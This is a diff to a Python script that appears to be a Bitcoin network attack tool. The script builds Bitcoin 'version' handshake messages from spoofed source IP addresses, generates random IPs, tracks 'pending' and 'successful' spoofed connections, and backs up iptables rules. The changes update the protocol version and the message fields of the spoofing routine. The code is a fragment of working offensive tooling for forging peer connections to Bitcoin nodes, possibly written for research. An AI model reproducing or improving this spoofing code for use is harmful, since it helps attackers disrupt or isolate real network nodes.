@@ -18,7 +18,7 @@ attacker_port = 8333
 pending_spoof_IPs = []
 successful_spoof_IPs = []
 
-pld_VERSION = '\xf9\xbe\xb4\xd9version\x00\x00\x00\x00\x00\x00\x00\x00\x00]\xf6\xe0\xe2'
+#pld_VERSION = '\xf9\xbe\xb4\xd9version\x00\x00\x00\x00\x00\x00\x00\x00\x00]\xf6\xe0\xe2'
 
 
 iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'
@@ -31,13 +31,13 @@ def terminal(cmd):
 def random_ip():
 	return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))
 
-def version_pkt(client_ip, server_ip, port):
+def version_pkt(src_ip, dst_ip, port):
     msg = msg_version()
-    msg.nVersion = 70002
-    msg.addrTo.ip = server_ip
-    msg.addrTo.port = port
-    msg.addrFrom.ip = client_ip
+    msg.nVersion = 70015 # Most up-to-date as of 3/20/20
+    msg.addrFrom.ip = src_ip
     msg.addrFrom.port = port
+    msg.addrTo.ip = dst_ip
+    msg.addrTo.port = port
     return msg
 
 def spoof(src_ip, dst_ip):
@@ -61,8 +61,11 @@ def spoof(src_ip, dst_ip):
 
 	print('\n\n*** ')
 	print('CONNECTION ESTABLISHED')
-	time.sleep(10)
+	
+	time.sleep(5)
 	s.close()
+
+	print('CONNECTION CLOSED')
 
 
 	#try:
